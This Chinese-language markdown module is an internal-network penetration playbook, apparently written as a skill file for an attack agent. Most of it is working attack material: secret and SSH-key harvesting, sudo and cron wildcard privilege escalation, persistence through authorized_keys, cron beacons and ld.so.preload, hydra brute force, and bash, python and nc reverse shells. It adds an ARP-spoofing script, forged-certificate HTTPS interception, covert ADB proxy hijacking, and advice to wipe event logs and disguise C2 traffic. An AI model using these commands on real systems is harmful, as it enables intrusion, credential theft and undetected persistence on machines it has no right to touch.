# 内网渗透模块 (Network)

> AD/域渗透/Kerberos/横向移动/凭据提取/NTLM Relay/密码攻击
> 环境适配：crackmapexec❌→hydra+ssh+nmap 替代

## 信息收集（拿到shell后第一步）

```bash
# Linux
whoami && id && uname -a && ifconfig && netstat -an | grep LISTEN
sudo -l 2>/dev/null
find / -perm -4000 -type f 2>/dev/null    # SUID
cat /etc/crontab && ls -la /etc/cron.*
cat ~/.bash_history | tail -50
env | grep -i "password\|secret\|key\|token"
ls -la ~/.ssh/

# Windows
whoami /all && systeminfo && netstat -ano
net user && net localgroup administrators
tasklist /v
```

## Linux 提权（按成功率）

```bash
# 1. sudo -l
sudo vim -c ':!/bin/bash'
sudo find / -exec /bin/bash \;
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo awk 'BEGIN {system("/bin/bash")}'

# 2. SUID
find / -perm -4000 -type f 2>/dev/null

# 3. 内核: uname -r → searchsploit linux kernel {version}

# 4. 通配符注入(cron里有tar)
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash" > /path/privesc.sh
touch /path/--checkpoint=1
touch /path/--checkpoint-action=exec=sh\ privesc.sh
```

## 横向移动

```bash
# 发现内网存活
for i in $(seq 1 254); do ping -c 1 -W 1 10.0.0.$i | grep "ttl="; done
nmap -sn 10.0.0.0/24

# 凭据搜集
cat ~/.ssh/id_rsa ~/.ssh/known_hosts
cat ~/.bash_history | grep -i "ssh\|mysql\|psql\|ftp"

# SSH横向
ssh -i ~/.ssh/id_rsa user@10.0.0.5
sshpass -p 'password' ssh user@10.0.0.5

# AD攻击(Windows内网)
crackmapexec smb 10.0.0.0/24 -u admin -p 'password'   # ❌缺失
# 替代: hydra + nmap扫描SMB + 手动横向
```

## 持久化

```bash
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.beacon") | crontab -
echo "/tmp/evil.so" > /etc/ld.so.preload
echo "nohup /tmp/.beacon &" >> ~/.bashrc
```

## 密码攻击

```bash
# 在线爆破
hydra -L users.txt -P passwords.txt ssh://{target}
hydra -l admin -P passwords.txt {target} http-form-post "/login:username=^USER^&password=^PASS^:Login failed"
# 离线破解
john --wordlist=rockyou.txt hashes.txt
hashcat -m 0 hashes.txt rockyou.txt        # MD5
hashcat -m 1000 hashes.txt rockyou.txt     # NTLM
```

## 反弹Shell

```bash
bash -i >& /dev/tcp/{ip}/{port} 0>&1
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
nc -e /bin/sh {ip} {port}
```

## 本机环境速查

```
已安装: hydra✅ john✅ hashcat✅ nmap✅ impacket 0.13.1✅
缺失: crackmapexec❌ → hydra+ssh+nmap替代
      responder❌ → scapy构造LLMNR/NBT-NS包
      bloodhound❌ → 手动枚举AD
      msfconsole❌ → searchsploit+nuclei找exp
```

---

## 知识锚点（Playbook + H1 案例）

> 本模块的实战知识锚点：playbook 流程 + H1 真实漏洞报告 + payload 库，三者交叉引用，确保方法论可追溯到真实案例。

### Playbook 流程

- [references/playbooks/intranet-postexp/00-index.md](../../references/playbooks/intranet-postexp/00-index.md) — 内网后渗透完整流程：凭据收集 / 横向移动 / 提权 / 域控 / 隧道，每个子阶段对应独立 playbook 文件（10-credentials / 11-lateral / 12-privesc / 14-domain / 15-tunneling / 16-recon / 17-persistence）

### H1 真实案例（references/h1-reports/by-weakness/）

- [improper-access-control-generic.md](../../references/h1-reports/by-weakness/improper-access-control-generic.md) — 内网服务访问控制缺陷，横向可达非授权资源
- [privilege-escalation.md](../../references/h1-reports/by-weakness/privilege-escalation.md) — 提权漏洞真实报告，从普通用户到 root/SYSTEM
- [use-of-hard-coded-credentials.md](../../references/h1-reports/by-weakness/use-of-hard-coded-credentials.md) — 硬编码凭据导致内网横向失守

### Payload 库

- [payloads/network/internal-payloads.md](../../payloads/network/internal-payloads.md) — 内网渗透常用 payload（扫描 / 枚举 / 凭据收集）
- [payloads/network/privesc-payloads.md](../../payloads/network/privesc-payloads.md) — 提权 payload 合集（sudo / SUID / cron / capability / 内核）

---

## MITM 中间人攻击 (mitm-proxy 能力)

> 当前环境：Android + proot，无法直接做网关级MITM
> 但可以做：代理级HTTP/HTTPS拦截 + ARP欺骗 + SSL证书伪造

### 底层原理：MITM 的核心是"让流量经过你"

```
MITM 三要素：
1. 流量劫持：让目标的流量经过你的设备
2. 解密/读取：对加密流量解密或直接读取明文
3. 重新封装：修改后转发，目标无感知

当前环境可行的MITM路径：
├── ARP欺骗（局域网）：告诉目标"我是网关"→ 流量经过你
│   工具：scapy 构造 ARP 响应包
│   限制：proot 环境 raw socket 受限，但 scapy 可用
├── 代理劫持：配置目标设备使用你的代理
│   工具：proxychains反向 + iptables 透明代理
│   限制：需要目标设备配合（或通过ADB修改Android设备代理）
├── DNS劫持：伪造DNS响应 → 目标访问你控制的IP
│   工具：scapy 构造 DNS 响应包
│   限制：proot 环境 raw socket 受限
└── SSL中间人：伪造证书 → 解密HTTPS流量
    工具：openssl 生成自签名证书 + 浏览器引擎代理
    限制：需要目标信任你的CA证书
```

### ARP 欺骗（局域网内）

```bash
# 用 scapy 构造 ARP 响应包
# 目标：告诉 192.168.1.5 你是 192.168.1.1（网关）
python3 << 'EOF'
from scapy.all import *

target_ip = "192.168.1.5"     # 目标设备
gateway_ip = "192.168.1.1"    # 真实网关
attacker_mac = "aa:bb:cc:dd:ee:ff"  # 你的MAC地址

# 欺骗目标：我是网关
arp_to_target = ARP(
    op=2,                     # ARP 响应
    psrc=gateway_ip,           # 声称这是网关IP
    hwsrc=attacker_mac,        # 但MAC是你
    pdst=target_ip
)
# 欺骗网关：我是目标
arp_to_gateway = ARP(
    op=2,
    psrc=target_ip,
    hwsrc=attacker_mac,
    pdst=gateway_ip
)

# 持续发送（每2秒一次，保持ARP表）
while True:
    send(arp_to_target, verbose=0)
    send(arp_to_gateway, verbose=0)
    time.sleep(2)
EOF

# 开启IP转发
echo 1 > /proc/sys/net/ipv4/ip_forward

# 用 tcpdump 抓取经过的流量
tcpdump -i wlan0 host 192.168.1.5 -w mitm_capture.pcap
```

### 代理劫持（通过ADB修改Android设备代理）

```bash
# 通过 ADB 修改目标 Android 设备的全局代理
# 设置代理为你的设备
adb shell settings put global http_proxy 192.168.1.8:8080

# 在你的设备上启动代理监听
# 用 python3 实现简单的 HTTP 代理
python3 << 'EOF'
import socket, threading, sys

def handle_client(client_socket):
    request = client_socket.recv(4096)
    # 解析请求
    first_line = request.split(b'\r\n')[0]
    print(f"[*] {first_line.decode()}")
    
    # 提取目标主机
    lines = request.split(b'\r\n')
    host = b''
    for line in lines:
        if line.lower().startswith(b'host:'):
            host = line.split(b': ')[1]
            break
    
    # 转发到真实服务器
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.connect((host, 80))
    server_socket.send(request)
    
    # 双向转发
    while True:
        data = server_socket.recv(4096)
        if not data: break
        client_socket.send(data)
    server_socket.close()
    client_socket.close()

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('0.0.0.0', 8080))
server.listen(5)
print("[*] HTTP proxy listening on 0.0.0.0:8080")
while True:
    client, addr = server.accept()
    threading.Thread(target=handle_client, args=(client,)).start()
EOF

# 恢复代理设置
adb shell settings put global http_proxy :0
```

### SSL 中间人（HTTPS 解密）

```bash
# 1. 生成 CA 证书
openssl genrsa -out ca.key 2048
openssl req -new -x509 -days 365 -key ca.key -out ca.crt \
  -subj "/C=CN/ST=Beijing/L=Beijing/O=Test/CN=Test CA"

# 2. 对每个目标域名生成伪造证书
openssl genrsa -out target.key 2048
openssl req -new -key target.key -out target.csr \
  -subj "/C=CN/ST=Beijing/CN=target.com"
openssl x509 -req -days 365 -in target.csr -CA ca.crt -CAkey ca.key \
  -CAcreateserial -out target.crt

# 3. 用浏览器引擎做 HTTPS 代理（Playwright 支持代理）
# browser 包可以配置代理，拦截HTTPS请求/响应
# 在 browser 启动时指定代理：
# --proxy-server=127.0.0.1:8080 --ignore-certificate-errors

# 4. 在Android设备上安装CA证书
# 通过ADB推送证书
adb push ca.crt /sdcard/
# 在设备上：设置 → 安全 → 安装证书 → 选择 ca.crt
# 注意：Android 7+ 系统证书需要root才能安装，但用户证书可能不够
# 替代：用 Frida 绕过 SSL Pinning（见 mobile 模块）
```

### 环境限制和替代

```
当前环境限制：
- proot 不支持 raw socket（ARP欺骗可能不可用）
- 无root（无法安装系统CA证书）
- 单网卡（无法做透明代理）

实际可行的MITM路径：
1. ADB代理劫持：修改目标设备代理 → 最可靠
2. Frida SSL Pinning绕过：对特定APP → 最精准
3. 浏览器引擎代理：对Web应用 → 最方便
4. 无线AP伪造：用 airodump-ng 创建假AP → 需要WiFi网卡支持监听模式
```

---

## 反爬钩子

> 内网渗透阶段的"反爬"体现为反检测：EDR / HIDS / IPS 可能拦截扫描、爆破、横向工具特征。目标是让操作看起来像合法管理员行为。

### 内网场景的反检测对抗

```
可能遇到的拦截场景：
1. 端口扫描 / 主机发现被 EDR/Snort 检测
   → 降速：nmap -T2 --scan-delay 5s
   → 用已有凭据做"合法"连接（ssh/wmi）替代裸扫描
2. hydra 在线爆破触发账户锁定策略
   → 控制重试间隔 + 小字典精准爆破
   → 优先离线破解（hashcat/john），避免在线爆破留痕
3. 横向工具特征明显（crackmapexec/impacket 日志）
   → 用合法协议原生命令替代（net use / ssh）
   → 操作后清理 4624/4688 等关键事件日志
4. 反弹 shell 被出站防火墙拦截
   → DNS/ICMP 隧道 / HTTPS 反弹（见 payloads/network/reverse-shells.md）
5. C2 流量被 DPI 识别
   → 域前置 / CDN 中转 / 合法域名伪装
```

通用反爬 / WAF 对抗策略参见 [references/methodology/06-anti-antibot.md](../../references/methodology/06-anti-antibot.md)。